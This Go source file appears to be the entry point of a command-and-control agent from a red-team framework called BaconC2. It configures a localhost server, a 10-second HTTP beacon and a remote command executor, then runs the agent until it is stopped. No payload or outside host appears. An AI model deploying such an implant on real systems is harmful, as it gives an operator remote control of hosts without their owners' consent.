package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
)

func main() {
	cfg := config.AgentConfig{
		AgentID:        "agent-001",
		ServerURL:      "http://localhost:8080",
		BeaconInterval: 10 * time.Second, // Beacon every 10 seconds
		Protocol:       "http",
	}

	transportProtocol := transport.NewHTTPTransport(cfg.ServerURL, cfg.AgentID)

	commandExecutor := executor.NewDefaultCommandExecutor()
	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor)
	if err := client.Initialize(); err != nil {
		log.Fatalf("Failed to initialize agent: %v", err)
	}

	if err := client.Start(); err != nil {
		log.Fatalf("Failed to start agent: %v", err)
	}
	log.Println("Agent client started successfully")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	client.Stop()
	log.Println("Agent client stopped")
}
